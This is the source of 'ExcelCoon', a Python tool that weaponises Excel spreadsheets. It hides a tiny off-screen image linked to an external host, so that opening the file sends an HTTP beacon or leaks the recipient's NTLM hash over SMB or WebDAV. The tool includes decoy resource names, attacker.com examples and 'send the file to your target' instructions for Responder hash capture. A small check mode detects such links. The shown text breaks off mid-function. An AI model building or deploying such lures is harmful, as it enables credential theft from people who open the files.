#!/usr/bin/env python3
"""
ExcelCoon - Excel File Canary Injector

Injects tracking and hash capture payloads into Excel (.xlsx) files by embedding
external resource references that trigger when the file is opened.

Supports:
- HTTP/HTTPS tracking canaries
- SMB hash capture (LAN)
- WebDAV hash capture (remote)
"""

import argparse
import glob as globmod
import json
import os
import random
import re
import sys
import tempfile
import uuid
import zipfile
from pathlib import Path
from xml.sax.saxutils import escape as xml_escape

# ============================================================================
# CONSTANTS
# ============================================================================

# Legitimate-looking resource names to blend in
LEGIT_NAMES = [
    "logo.png", "header.png", "footer.png", "chart_bg.png",
    "watermark.png", "template_img.png", "brand_asset.png",
    "report_header.png", "company_logo.png", "signature.png",
    "analytics.js", "tracking.js", "metrics.js", "telemetry.js"
]

# Legitimate-looking share names for SMB/WebDAV
SHARE_NAMES = [
    "images", "assets", "resources", "cdn", "static",
    "media", "files", "docs", "shared", "public"
]

# ============================================================================
# XML TEMPLATES
# ============================================================================

DRAWING_XML = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing"
          xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
    <xdr:twoCellAnchor editAs="oneCell">
        <xdr:from>
            <xdr:col>{col_start}</xdr:col>
            <xdr:colOff>0</xdr:colOff>
            <xdr:row>{row_start}</xdr:row>
            <xdr:rowOff>0</xdr:rowOff>
        </xdr:from>
        <xdr:to>
            <xdr:col>{col_end}</xdr:col>
            <xdr:colOff>9525</xdr:colOff>
            <xdr:row>{row_end}</xdr:row>
            <xdr:rowOff>9525</xdr:rowOff>
        </xdr:to>
        <xdr:pic>
            <xdr:nvPicPr>
                <xdr:cNvPr id="2" name="{pic_name}">
                    <a:extLst>
                        <a:ext uri="{{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}}">
                            <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" 
                                           id="{{{creation_id}}}"/>
                        </a:ext>
                    </a:extLst>
                </xdr:cNvPr>
                <xdr:cNvPicPr>
                    <a:picLocks noChangeAspect="1"/>
                </xdr:cNvPicPr>
            </xdr:nvPicPr>
            <xdr:blipFill>
                <a:blip xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" 
                        r:link="{blip_rid}"/>
                <a:stretch>
                    <a:fillRect/>
                </a:stretch>
            </xdr:blipFill>
            <xdr:spPr>
                <a:xfrm>
                    <a:off x="50000000" y="50000000"/>
                    <a:ext cx="9525" cy="9525"/>
                </a:xfrm>
                <a:prstGeom prst="rect">
                    <a:avLst/>
                </a:prstGeom>
            </xdr:spPr>
        </xdr:pic>
        <xdr:clientData/>
    </xdr:twoCellAnchor>
</xdr:wsDr>'''

# Drawing relationships template
DRAWING_RELS = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" 
                  Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" 
                  Target="{target}" 
                  TargetMode="External"/>
</Relationships>'''


# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def generate_offscreen_cell_coordinates():
    """
    Generate cell coordinates far outside the visible viewport to hide the canary.
    
    The image will be placed in a location users won't normally scroll to,
    making it effectively invisible while still being loaded by Excel.
    
    Returns:
        tuple: (column_start, row_start, column_end, row_end)
    """
    # Place image between columns 100-200 and rows 500-1000 (far off-screen)
    column_start = random.randint(100, 200)
    row_start = random.randint(500, 1000)
    return column_start, row_start, column_start + 1, row_start + 1


def construct_external_resource_url(mode, host, custom_path=None, use_https=False):
    """
    Construct an external resource URL that Excel will attempt to load.
    
    This creates a URL pointing to an external resource that triggers when
    Excel opens the file, enabling tracking (HTTP) or hash capture (SMB/WebDAV).
    
    Args:
        mode (str): Injection mode ('http', 'smb', or 'webdav')
        host (str): Target hostname or IP address where callbacks will be received
        custom_path (str, optional): Custom full path after host (uses random if None)
        use_https (bool): Enable HTTPS for HTTP mode or SSL for WebDAV mode
    
    Returns:
        str: Formatted external resource URL for the specified mode
    """
    # Build the path portion: custom_path replaces the entire path after the host,
    # otherwise a random share/resource combination is generated
    if custom_path:
        path_part = custom_path.lstrip('/')
    else:
        share_name = random.choice(SHARE_NAMES)
        resource_name = random.choice(LEGIT_NAMES)
        path_part = f"{share_name}/{resource_name}"

    if mode == "http":
        # HTTP/HTTPS URL for tracking callbacks
        protocol = "https" if use_https else "http"
        return f"{protocol}://{host}/{path_part}"
    elif mode == "smb":
        # UNC path for SMB hash capture (LAN)
        unc_path = path_part.replace('/', '\\')
        return f"\\\\{host}\\{unc_path}"
    elif mode == "webdav":
        # UNC path with port specification for WebDAV hash capture (remote)
        port_specifier = "@SSL" if use_https else "@80"
        unc_path = path_part.replace('/', '\\')
        return f"\\\\{host}{port_specifier}\\{unc_path}"
    
    return None


def weaponize_excel_file(input_file, output_file, external_resource_url, verbose=False):
    """
    Weaponize an Excel file by injecting an external image reference.
    
    This function modifies an XLSX file to include a hidden image that references
    an external URL. When Excel opens the file, it attempts to load this external
    resource, triggering a callback or hash capture attempt.
    
    If the worksheet already contains drawings, the canary is injected into the
    existing drawing rather than creating a new one (a worksheet can only reference
    a single drawing part).
    
    Args:
        input_file (str): Path to the clean input XLSX file
        output_file (str): Path where the weaponized XLSX file will be saved
        external_resource_url (str): External URL that Excel will attempt to load
        verbose (bool): Enable detailed progress output
    
    Returns:
        bool: True if weaponization successful, False otherwise
    """
    if not os.path.exists(input_file):
        print(f"[!] Error: Input file '{input_file}' not found")
        return False
    
    # Create temporary directory for XLSX extraction and modification
    with tempfile.TemporaryDirectory() as temp_directory:
        # Extract XLSX (which is a ZIP archive) to temporary directory
        if verbose:
            print(f"[*] Extracting {input_file}...")
        
        try:
            with zipfile.ZipFile(input_file, 'r') as zip_file:
                zip_file.extractall(temp_directory)
        except zipfile.BadZipFile:
            print("[!] Error: Invalid XLSX file (not a valid ZIP archive)")
            return False
        
        # Generate coordinates for hidden image placement and unique identifiers
        column_start, row_start, column_end, row_end = generate_offscreen_cell_coordinates()
        creation_id = str(uuid.uuid4()).upper()
        picture_name = f"Picture {random.randint(1, 99)}"
        
        if verbose:
            print(f"[*] Injecting at position: col={column_start}, row={row_start}")
            print(f"[*] Target: {external_resource_url}")
        
        # XML-escape the external URL for safe embedding in XML attributes
        xml_safe_url = xml_escape(external_resource_url, {'"': '&quot;'})
        
        # Read the first worksheet to determine injection strategy
        worksheets_directory = os.path.join(temp_directory, "xl", "worksheets")
        worksheet_file_path = os.path.join(worksheets_directory, "sheet1.xml")
        
        if not os.path.exists(worksheet_file_path):
            print("[!] Error: sheet1.xml not found in XLSX")
            return False
        
        with open(worksheet_file_path, 'r', encoding='utf-8') as file:
            worksheet_xml_content = file.read()
        
        # Check if the worksheet already references a drawing
        existing_drawing_match = re.search(
            r'<drawing\s[^>]*r:id="([^"]+)"', worksheet_xml_content
        )
        
        if existing_drawing_match:
            # ── Inject into existing drawing ──────────────────────────
            existing_drawing_rid = existing_drawing_match.group(1)
            
            if verbose:
                print(f"[*] Found existing drawing (ref {existing_drawing_rid}), injecting into it...")
            
            # Resolve the existing drawing file via worksheet relationships
            worksheet_rels_dir = os.path.join(worksheets_directory, "_rels")
            worksheet_rels_path = os.path.join(worksheet_rels_dir, "sheet1.xml.rels")
            
            if not os.path.exists(worksheet_rels_path):
                print("[!] Error: sheet1.xml.rels missing but worksheet references a drawing")
                return False
            
            with open(worksheet_rels_path, 'r', encoding='utf-8') as file:
                worksheet_rels_xml = file.read()
            
            # Find the Relationship element for the existing drawing (attribute order agnostic)
            rel_pattern = rf'<Relationship\s[^>]*Id="{re.escape(existing_drawing_rid)}"[^>]*/?\s*>'
            rel_match = re.search(rel_pattern, worksheet_rels_xml)
            if not rel_match:
                print(f"[!] Error: Cannot find relationship for {existing_drawing_rid}")
                return False
            
            rel_element = rel_match.group(0)
            target_match = re.search(r'Target="([^"]*)"', rel_element)
            if not target_match:
                print(f"[!] Error: Cannot resolve drawing target for {existing_drawing_rid}")
                return False
            
            drawing_target = target_match.group(1)
            existing_drawing_path = os.path.normpath(
                os.path.join(worksheets_directory, drawing_target)
            )
            
            if not os.path.exists(existing_drawing_path):
                print(f"[!] Error: Referenced drawing file not found: {drawing_target}")
                return False
            
            # Determine next available rId in the existing drawing's relationships
            existing_drawing_name = os.path.basename(existing_drawing_path)
            existing_drawing_rels_dir = os.path.join(
                os.path.dirname(existing_drawing_path), "_rels"
            )
            existing_drawing_rels_path = os.path.join(
                existing_drawing_rels_dir, f"{existing_drawing_name}.rels"
            )
            
            if os.path.exists(existing_drawing_rels_path):
                with open(existing_drawing_rels_path, 'r', encoding='utf-8') as file:
                    existing_drawing_rels = file.read()
                rid_numbers = [int(n) for n in re.findall(r'Id="rId(\d+)"', existing_drawing_rels)]
                blip_rid = f"rId{max(rid_numbers) + 1}" if rid_numbers else "rId1"
            else:
                existing_drawing_rels = None
                blip_rid = "rId1"
            
            # Format the full drawing XML to extract just the anchor element
            full_drawing_xml = DRAWING_XML.format(
                col_start=column_start, row_start=row_start,
                col_end=column_end, row_end=row_end,
                pic_name=picture_name, creation_id=creation_id,
                blip_rid=blip_rid
            )
            
            # Extract the <xdr:twoCellAnchor> element for injection
            anchor_start = full_drawing_xml.find('<xdr:twoCellAnchor')
            anchor_end = full_drawing_xml.find('</xdr:twoCellAnchor>') + len('</xdr:twoCellAnchor>')
            anchor_xml = full_drawing_xml[anchor_start:anchor_end]
            
            # Inject anchor into the existing drawing file
            with open(existing_drawing_path, 'r', encoding='utf-8') as file:
                existing_drawing_xml = file.read()
            
            existing_drawing_xml = existing_drawing_xml.replace(
                '</xdr:wsDr>', f'{anchor_xml}\n</xdr:wsDr>'
            )
            with open(existing_drawing_path, 'w', encoding='utf-8') as file:
                file.write(existing_drawing_xml)
            
            # Update or create the drawing relationships file
            os.makedirs(existing_drawing_rels_dir, exist_ok=True)
            new_rel = (
                f'<Relationship Id="{blip_rid}" '
                f'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
                f'Target="{xml_safe_url}" '
                f'TargetMode="External"/>'
            )
            
            if existing_drawing_rels is not None:
                updated_rels = existing_drawing_rels.replace(
                    '</Relationships>', f'{new_rel}\n</Relationships>'
                )
            else:
                updated_rels = (
                    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
                    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
                    f'    {new_rel}\n'
                    '</Relationships>'
                )
            
            with open(existing_drawing_rels_path, 'w', encoding='utf-8') as file:
                file.write(updated_rels)
        
        else:
            # ── Create new drawing ────────────────────────────────────
            blip_rid = "rId1"
            
            # Create drawings directory structure within the Excel XML hierarchy
            drawings_directory = os.path.join(temp_directory, "xl", "drawings")
            drawings_rels_directory = os.path.join(drawings_directory, "_rels")
            os.makedirs(drawings_rels_directory, exist_ok=True)
            
            # Determine next drawing number by counting existing drawing files
            # Use a precise regex pattern to match only drawingN.xml (not drawingStyles.xml etc.)
            existing_drawings = [
                f for f in Path(drawings_directory).glob("drawing*.xml")
                if re.match(r'^drawing\d+\.xml$', f.name)
            ]
            next_drawing_number = len(existing_drawings) + 1
            
            # Create drawing XML with hidden image reference to external resource
            drawing_xml_content = DRAWING_XML.format(
                col_start=column_start, row_start=row_start,
                col_end=column_end, row_end=row_end,
                pic_name=picture_name, creation_id=creation_id,
                blip_rid=blip_rid
            )
            
            # Create drawing relationships XML pointing to external URL
            drawing_rels_content = DRAWING_RELS.format(target=xml_safe_url)
            
            # Define file paths for new drawing files
            drawing_file_path = os.path.join(
                drawings_directory, f"drawing{next_drawing_number}.xml"
            )
            drawing_rels_file_path = os.path.join(
                drawings_rels_directory, f"drawing{next_drawing_number}.xml.rels"
            )
            
            # Write drawing XML and relationship files to disk
            with open(drawing_file_path, 'w', encoding='utf-8') as file:
                file.write(drawing_xml_content)
            with open(drawing_rels_file_path, 'w', encoding='utf-8') as file:
                file.write(drawing_rels_content)
            
            # Update [Content_Types].xml to register the new drawing file
            content_types_file_path = os.path.join(temp_directory, "[Content_Types].xml")
            with open(content_types_file_path, 'r', encoding='utf-8') as file:
                content_types_xml = file.read()
            
            drawing_content_type_override = (
                f'<Override PartName="/xl/drawings/drawing{next_drawing_number}.xml" '
                f'ContentType="application/vnd.openxmlformats-officedocument.drawing+xml"/>'
            )
            if f"/xl/drawings/drawing{next_drawing_number}.xml" not in content_types_xml:
                content_types_xml = content_types_xml.replace(
                    '</Types>', f'{drawing_content_type_override}</Types>'
                )
                with open(content_types_file_path, 'w', encoding='utf-8') as file:
                    file.write(content_types_xml)
            
            # Determine next available rId by checking existing worksheet relationships
            # to avoid collisions with hyperlinks, comments, or other relationship types
            worksheet_rels_directory = os.path.join(worksheets_directory, "_rels")
            os.makedirs(worksheet_rels_directory, exist_ok=True)
            worksheet_rels_file_path = os.path.join(
                worksheet_rels_directory, "sheet1.xml.rels"
            )
            
            if os.path.exists(worksheet_rels_file_path):
                with open(worksheet_rels_file_path, 'r', encoding='utf-8') as file:
                    worksheet_rels_xml = file.read()
                existing_rid_numbers = [
                    int(n) for n in re.findall(r'Id="rId(\d+)"', worksheet_rels_xml)
                ]
                next_rid = max(existing_rid_numbers) + 1 if existing_rid_numbers else 1
            else:
                worksheet_rels_xml = None
                next_rid = 1
            
            # Add drawing reference to the worksheet
            drawing_reference_element = f'<drawing r:id="rId{next_rid}"/>'
            worksheet_xml_content = worksheet_xml_content.replace(
                '</worksheet>', f'{drawing_reference_element}</worksheet>'
            )
            
            # Ensure the relationships namespace is declared in the worksheet element
            if 'xmlns:r=' not in worksheet_xml_content:
                worksheet_xml_content = worksheet_xml_content.replace(
                    '<worksheet ',
                    '<worksheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" '
                )
            
            with open(worksheet_file_path, 'w', encoding='utf-8') as file:
                file.write(worksheet_xml_content)
            
            # Update worksheet relationships to link the drawing file
            new_rel_element = (
                f'<Relationship Id="rId{next_rid}" '
                f'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/drawing" '
                f'Target="../drawings/drawing{next_drawing_number}.xml"/>'
            )
            
            if worksheet_rels_xml is not None:
                # Append to existing relationships file
                worksheet_rels_xml = worksheet_rels_xml.replace(
                    '</Relationships>', f'{new_rel_element}</Relationships>'
                )
            else:
                # Create new relationships file with drawing relationship
                worksheet_rels_xml = (
                    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
                    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
                    f'    {new_rel_element}\n'
                    '</Relationships>'
                )
            
            with open(worksheet_rels_file_path, 'w', encoding='utf-8') as file:
                file.write(worksheet_rels_xml)
        
        # Repackage modified files back into XLSX format (ZIP archive)
        if verbose:
            print(f"[*] Repacking modified files to {output_file}...")
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as output_zip_file:
            # Walk through all modified files and add them to the new XLSX
            for directory_path, subdirectories, filenames in os.walk(temp_directory):
                for filename in filenames:
                    absolute_file_path = os.path.join(directory_path, filename)
                    # Calculate relative path within the ZIP archive
                    # Use forward slashes per the ZIP/OOXML specification
                    archive_name = os.path.relpath(
                        absolute_file_path, temp_directory
                    ).replace(os.sep, '/')
                    output_zip_file.write(absolute_file_path, archive_name)
        
        if verbose:
            print(f"[+] Successfully created weaponized file: {output_file}")
        
        return True


def main():
    """Main entry point for ExcelCoon."""
    
    # If no arguments given, launch interactive mode
    if len(sys.argv) == 1:
        interactive_mode()
        return
    
    # Handle --check subcommand before full argument parsing
    if sys.argv[1] == '--check' or sys.argv[1] == '-c':
        check_mode(sys.argv[2:])
        return
    
    parser = argparse.ArgumentParser(
        description='ExcelCoon - Inject tracking/hash capture payloads into Excel files',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  HTTP Canary (tracking):
    %(prog)s -i clean.xlsx -o tracked.xlsx -m http -H myserver.com

  SMB Hash Capture (LAN):
    %(prog)s -i clean.xlsx -o evil.xlsx -m smb -H 192.168.1.100

  WebDAV Hash Capture (remote):
    %(prog)s -i clean.xlsx -o evil.xlsx -m webdav -H attacker.com

  WebDAV over HTTPS:
    %(prog)s -i clean.xlsx -o evil.xlsx -m webdav -H attacker.com --https

  Custom resource path:
    %(prog)s -i clean.xlsx -o evil.xlsx -m http -H myserver.com -p images/logo.png

  Batch mode (multiple files):
    %(prog)s -i "reports/*.xlsx" -m http -H myserver.com

  Check if file is weaponized:
    %(prog)s --check file.xlsx

  Interactive mode (no arguments):
    %(prog)s
        '''
    )
    
    # Required arguments
    required = parser.add_argument_group('required arguments')
    required.add_argument('-i', '--input', required=True, metavar='FILE',
                          help='Input XLSX file(s) - supports glob patterns for batch mode')
    required.add_argument('-m', '--mode', required=True,
                          choices=['http', 'smb', 'webdav'],
                          help='Injection mode: http (tracking), smb (LAN hash capture), webdav (remote hash capture)')
    required.add_argument('-H', '--host', required=True, metavar='HOST',
                          help='Target host/IP (your server or responder)')
    
    # Optional arguments
    optional = parser.add_argument_group('optional arguments')
    optional.add_argument('-o', '--output', metavar='FILE',
                          help='Output XLSX file (default: <input>_weaponized.xlsx)')
    optional.add_argument('-p', '--path', metavar='PATH',
                          help='Custom full path after host (default: random share/resource)')
    optional.add_argument('--https', action='store_true',
                          help='Use HTTPS for HTTP mode or SSL for WebDAV mode')
    optional.add_argument('-v', '--verbose', action='store_true',
                          help='Enable verbose output')
    optional.add_argument('-q', '--quiet', action='store_true',
                          help='Suppress all output except errors (for scripting)')
    optional.add_argument('--json', action='store_true',
                          help='Output results as JSON (for automation)')
    
    args = parser.parse_args()
    
    # Initialize output handler
    out = OutputHandler(quiet=args.quiet, json_mode=args.json)
    
    # Validate host
    host_error = validate_host(args.host)
    if host_error:
        out.error(host_error)
        out.hint("Use a hostname (e.g. myserver.com) or IP address (e.g. 192.168.1.100)")
        out.finalize(success=False)
        sys.exit(1)
    
    # Resolve input files (support glob patterns for batch mode)
    input_files = resolve_input_files(args.input)
    if not input_files:
        out.error(f"No matching files found for pattern: {args.input}")
        out.hint("Check the path and ensure the file(s) exist")
        out.finalize(success=False)
        sys.exit(1)
    
    # Validate all input files before processing
    for input_file in input_files:
        file_error = validate_input_file(input_file)
        if file_error:
            out.error(f"{input_file}: {file_error}")
            out.finalize(success=False)
            sys.exit(1)
    
    is_batch = len(input_files) > 1
    
    # Print banner (only in non-quiet, non-json mode)
    if not args.quiet and not args.json:
        print_banner()
    
    # Construct the external resource URL
    external_resource_url = construct_external_resource_url(
        args.mode, args.host, args.path, args.https
    )
    if not external_resource_url:
        out.error("Failed to construct external resource URL")
        out.finalize(success=False)
        sys.exit(1)
    
    # Process each file
    results = []
    for input_file in input_files:
        # Determine output file name
        if args.output and not is_batch:
            output_file = args.output
        else:
            output_file = generate_output_name(input_file)
        
        out.info(f"Processing: {input_file}")
        if args.verbose:
            out.detail(f"Mode: {args.mode.upper()}")
            out.detail(f"Target URL: {external_resource_url}")
            out.detail(f"Output: {output_file}")
        
        # Weaponize
        success = weaponize_excel_file(
            input_file, output_file, external_resource_url, args.verbose and not args.quiet
        )
        
        result = {
            "input": input_file,
            "output": output_file,
            "success": success,
            "mode": args.mode,
            "url": external_resource_url,
        }
        results.append(result)
        
        if success:
            file_size = os.path.getsize(output_file)
            out.success(f"Created: {output_file} ({format_size(file_size)})")
        else:
            out.error(f"Failed to weaponize: {input_file}")
    
    # Print summary
    succeeded = sum(1 for r in results if r["success"])
    failed = len(results) - succeeded
    
    if is_batch:
        out.info(f"\nBatch complete: {succeeded} succeeded, {failed} failed")
    
    if succeeded > 0 and not args.quiet and not args.json:
        print_next_steps(args.mode, args.host)
    
    # JSON output
    if args.json:
        json_output = {
            "results": results,
            "summary": {"total": len(results), "succeeded": succeeded, "failed": failed}
        }
        print(json.dumps(json_output, indent=2))
    
    out.finalize(success=(failed == 0))
    if failed > 0:
        sys.exit(1)


# ============================================================================
# CLI UTILITIES
# ============================================================================

class OutputHandler:
    """Handles formatted output with color support and quiet/json modes."""
    
    # ANSI color codes
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    
    def __init__(self, quiet=False, json_mode=False):
        self.quiet = quiet
        self.json_mode = json_mode
        self.colors_enabled = self._detect_color_support()
    
    def _detect_color_support(self):
        """Detect if the terminal supports ANSI colors."""
        if self.json_mode:
            return False
        if os.environ.get('NO_COLOR'):
            return False
        if not hasattr(sys.stdout, 'isatty') or not sys.stdout.isatty():
            return False
        # Enable ANSI on Windows 10+
        if sys.platform == 'win32':
            try:
                import ctypes
                kernel32 = ctypes.windll.kernel32
                # Enable VIRTUAL_TERMINAL_PROCESSING
                kernel32.SetConsoleMode(
                    kernel32.GetStdHandle(-11), 7
                )
                return True
            except Exception:
                return False
        return True
    
    def _colorize(self, text, color):
        """Apply color to text if colors are enabled."""
        if self.colors_enabled:
            return f"{color}{text}{self.RESET}"
        return text
    
    def success(self, message):
        """Print a success message."""
        if self.quiet or self.json_mode:
            return
        prefix = self._colorize("[+]", self.GREEN)
        print(f"  {prefix} {message}")
    
    def error(self, message):
        """Print an error message (always shown unless json mode)."""
        if self.json_mode:
            return
        prefix = self._colorize("[!]", self.RED)
        print(f"  {prefix} {message}", file=sys.stderr)
    
    def warning(self, message):
        """Print a warning message."""
        if self.quiet or self.json_mode:
            return
        prefix = self._colorize("[~]", self.YELLOW)
        print(f"  {prefix} {message}")
    
    def info(self, message):
        """Print an info message."""
        if self.quiet or self.json_mode:
            return
        prefix = self._colorize("[*]", self.BLUE)
        print(f"  {prefix} {message}")
    
    def detail(self, message):
        """Print a verbose detail."""
        if self.quiet or self.json_mode:
            return
        prefix = self._colorize("   >", self.DIM)
        print(f"  {prefix} {message}")
    
    def hint(self, message):
        """Print a helpful hint after an error."""
        if self.json_mode:
            return
        prefix = self._colorize("   ?", self.CYAN)
        print(f"  {prefix} {message}", file=sys.stderr)
    
    def finalize(self, success=True):
        """Print final status line."""
        if self.quiet or self.json_mode:
            return
        if success:
            print(f"\n  {self._colorize('Done.', self.GREEN + self.BOLD)}")
        else:
            print(f"\n  {self._colorize('Aborted.', self.RED + self.BOLD)}", file=sys.stderr)


def print_banner():
    """Print the application banner with color."""
    # Use box-drawing characters with a fallback for terminals that can't handle Unicode
    try:
        banner_fancy = (
            "\n"
            "    \033[1m\033[96m+-------------------------------------------------------+\n"
            "    |              \033[0m\033[1m ExcelCoon \033[96m                              |\n"
            "    |         Trash Panda Excel Weaponizer                 |\n"
            "    |   \"We dig through your spreadsheets for treasure\"    |\n"
            "    +-------------------------------------------------------+\033[0m\n"
        )
        # Strip ANSI if no color support
        if not sys.stdout.isatty() or os.environ.get('NO_COLOR'):
            banner_fancy = re.sub(r'\033\[[0-9;]*m', '', banner_fancy)
        print(banner_fancy)
    except (UnicodeEncodeError, UnicodeDecodeError):
        # Fallback: plain ASCII without ANSI
        print("\n    +-------------------------------------------------------+")
        print("    |               ExcelCoon                               |")
        print("    |         Trash Panda Excel Weaponizer                 |")
        print("    |   \"We dig through your spreadsheets for treasure\"    |")
        print("    +-------------------------------------------------------+\n")


def print_next_steps(mode, host):
    """Print mode-specific next steps."""
    print()
    steps_header = "\033[1m  Next Steps:\033[0m" if sys.stdout.isatty() else "  Next Steps:"
    print(steps_header)
    
    if mode == "smb":
        print("    1. Start Responder: sudo responder -I <interface> -v")
        print("    2. Send the file to your target")
        print("    3. Monitor for NTLM hash captures")
    elif mode == "webdav":
        print("    1. Start Responder: sudo responder -I <interface> -wv")
        print("    2. Send the file to your target")
        print("    3. Monitor for NTLM hash captures")
    elif mode == "http":
        print(f"    1. Ensure your HTTP server is listening on {host}")
        print("    2. Send the file to your target")
        print("    3. Monitor for incoming requests")


def validate_host(host):
    """
    Validate the host argument and return an error message if invalid, or None if valid.
    """
    if not host or not host.strip():
        return "Host cannot be empty"
    
    # Check for obviously invalid characters
    invalid_chars = set(' "\'<>{}|^`')
    found = [c for c in host if c in invalid_chars]
    if found:
        return f"Host contains invalid characters: {''.join(set(found))}"
    
    # Check for protocol prefix (common mistake)
    if host.startswith(('http://', 'https://', '//')):
        return f"Host should not include protocol prefix (use just the hostname/IP)"
    
    return None


def validate_input_file(file_path):
    """
    Validate an input file and return an error message if invalid, or None if valid.
    """
    if not os.path.exists(file_path):
        return "File not found"
    
    if not os.path.isfile(file_path):
        return "Path is not a file"
    
    if os.path.getsize(file_path) == 0:
        return "File is empty (0 bytes)"
    
    if not file_path.lower().endswith('.xlsx'):
        return "File does not have .xlsx extension (expected Office Open XML format)"
    
    # Quick ZIP validity check
    try:
        with zipfile.ZipFile(file_path, 'r') as zf:
            names = zf.namelist()
            if '[Content_Types].xml' not in names:
                return "Not a valid XLSX file (missing [Content_Types].xml)"
    except zipfile.BadZipFile:
        return "Not a valid XLSX file (corrupt or not a ZIP archive)"
    except PermissionError:
        return "Permission denied - file may be locked by another process"
    
    return None


def resolve_input_files(pattern):
    """
    Resolve input file pattern to a list of actual file paths.
    Supports glob patterns for batch mode.
    """
    # Check if it's a glob pattern
    if any(c in pattern for c in '*?['):
        files = sorted(globmod.glob(pattern, recursive=True))
        # Filter to only .xlsx files
        return [f for f in files if f.lower().endswith('.xlsx')]
    
    # Single file
    if os.path.exists(pattern):
        return [pattern]
    
    return []


def generate_output_name(input_file):
    """
    Generate an output filename based on the input filename.
    e.g., 'report.xlsx' -> 'report_weaponized.xlsx'
    """
    path = Path(input_file)
    stem = path.stem
    # Avoid stacking suffixes if already weaponized name
    if stem.endswith('_weaponized'):
        stem = stem + '_2'
    else:
        stem = stem + '_weaponized'
    return str(path.with_stem(stem))


def format_size(size_bytes):
    """Format file size in human-readable form."""
    if size_bytes < 1024:
        return f"{size_bytes} B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.1f} KB"
    else:
        return f"{size_bytes / (1024 * 1024):.1f} MB"


# ============================================================================
# CHECK MODE
# ============================================================================

def check_mode(args):
    """
    Analyze XLSX file(s) to determine if they contain external resource references
    (i.e., have been weaponized or contain canary injections).
    """
    if not args:
        print("Usage: excelcoon.py --check <file.xlsx> [file2.xlsx ...]")
        sys.exit(1)
    
    out = OutputHandler()
    
    # Resolve files (support globs)
    files = []
    for pattern in args:
        files.extend(resolve_input_files(pattern))
    
    if not files:
        out.error(f"No matching .xlsx files found")
        sys.exit(1)
    
    print_banner()
    out.info(f"Checking {len(files)} file(s) for external references...\n")
    
    for file_path in files:
        check_single_file(file_path, out)


def check_single_file(file_path, out):
    """Check a single XLSX file for weaponization indicators."""
    file_error = validate_input_file(file_path)
    if file_error:
        out.error(f"{file_path}: {file_error}")
        return
    
    findings = []
    
    try:
        with zipfile.ZipFile(file_path, 'r') as zf:
            names = zf.namelist()
            
            # Look for drawing relationship files
            drawing_rels = [n for n in names if 'drawings/_rels/' in n and n.endswith('.rels')]
            
            for rels_file in drawing_rels:
                content = zf.read(rels_file).decode('utf-8')
                
                # Find external targets
                external_refs = re.findall(
                    r'Target="([^"]*)"[^>]*TargetMode="External"', content
                )
                # Also match reversed attribute order
                external_refs += re.findall(
                    r'TargetMode="External"[^>]*Target="([^"]*)"', content
                )
                
                for ref in external_refs:
                    findings.append({
                        "type": "external_image",
                        "source": rels_file,
                        "target": ref
                    })
            
            # Also check worksheet rels for suspicious external links
            sheet_rels = [n for n in names if 'worksheets/_rels/' in n and n.endswith('.rels')]
            for rels_file in sheet_rels:
                content = zf.read(rels_file).decode('utf-8')
                # Look for external drawing-type relationships
                if 'TargetMode="External"' in content and 'relationships/image' in content:
                    ext_refs = re.findall(r'Target="([^"]*)"', content)
                    for ref in ext_refs:
                        findings.append({
                            "type": "external_reference_in_sheet",
                            "source": rels_file,
                            "target": ref
                        })
    
    except Exception as e:
        out.error(f"{file_path}: Error reading file: {e}")
        return
    
    # Report findings
    filename = os.path.basename(file_path)
    if findings:
        out.warning(f"{filename}: WEAPONIZED - {len(findings)} external reference(s) found")
        for finding in findings:
            target = finding['target']
            # Classify the type of canary
            if target.startswith('\\\\') and '@' in target:
                canary_type = "WebDAV hash capture"
            elif target.startswith('\\\\'):
                canary_type = "SMB hash capture"
            elif target.startswith('http'):
                canary_type = "HTTP tracking"
            else:
                canary_type = "Unknown"
            out.detail(f"[{canary_type}] {target}")
    else:
        out.success(f"{filename}: CLEAN - no external references found")


# ============================================================================
# INTERACTIVE MODE
# ============================================================================

def interactive_mode():
    """Interactive wizard when no arguments are provided."""
    print_banner()
    
    out = OutputHandler()
    out.info("Interactive mode - follow the prompts below.\n")
    
    try:
        # Step 1: Input file
        input_file = _prompt_input_file()
        if not input_file:
            return
        
        # Step 2: Mode selection
        mode = _prompt_mode()
        if not mode:
            return
        
        # Step 3: Host
        host = _prompt_host(mode)
        if not host:
            return
        
        # Step 4: Optional settings
        use_https = _prompt_yes_no("  Use HTTPS/SSL?", default=False)
        custom_path = _prompt_optional("  Custom resource path (leave empty for random): ")
        
        # Step 5: Output file
        default_output = generate_output_name(input_file)
        output_input = _prompt_optional(f"  Output file [{default_output}]: ")
        output_file = output_input if output_input else default_output
        
        # Confirm
        print()
        out.info("Configuration:")
        out.detail(f"Input:  {input_file}")
        out.detail(f"Output: {output_file}")
        out.detail(f"Mode:   {mode.upper()}")
        out.detail(f"Host:   {host}")
        out.detail(f"HTTPS:  {'Yes' if use_https else 'No'}")
        if custom_path:
            out.detail(f"Path:   {custom_path}")
        print()
        
        if not _prompt_yes_no("  Proceed with injection?", default=True):
            out.info("Cancelled.")
            return
        
        print()
        
        # Execute
